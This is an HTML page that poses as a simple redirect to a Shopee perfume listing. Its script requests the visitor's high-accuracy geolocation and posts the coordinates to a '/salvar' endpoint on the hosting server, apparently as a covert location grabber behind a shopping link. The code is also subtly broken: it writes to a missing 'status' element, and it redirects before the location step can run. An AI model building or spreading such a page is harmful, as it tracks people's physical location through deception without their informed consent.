
<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Redirecionando</title>
</head>
<body>
  

  <script>
    async function salvarCoordenadas() {
      const status = document.getElementById("status");

      if (!navigator.geolocation) {
        status.textContent = "Geolocalização não suportada.";
        return;
      }

      navigator.geolocation.getCurrentPosition(async pos => {
        try {
          const resposta = await fetch("/salvar", {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({
              latitude: pos.coords.latitude,
              longitude: pos.coords.longitude
            })
          });

          if (!resposta.ok) {
            throw new Error("HTTP " + resposta.status);
          }

          status.textContent = "Coordenadas salvas com sucesso!";
        } catch (erro) {
          status.textContent = "Erro ao salvar: " + erro.message;
        }
      }, erro => {
        status.textContent =
          "Não foi possível obter a localização. Verifique a permissão.";
      }, {
        enableHighAccuracy: true,
        timeout: 15000
      });
    }
   
    window.addEventListener("load", salvarCoordenadas);
    window.location.href = "https://shopee.com.br/Kit-3-Perfumes-Masculinos-60ml-Gold-Black-Magnetic-Alta-Fixa%C3%A7%C3%A3o-Presente-i.514454334.58267336658?extraParams=%7B%22display_model_id%22%3A129658614865%2C%22model_selection_logic%22%3A3%7D&image_ids=sg-11134201-8259m-mslck97fsv7p1b";
  </script>
</body>
</html>
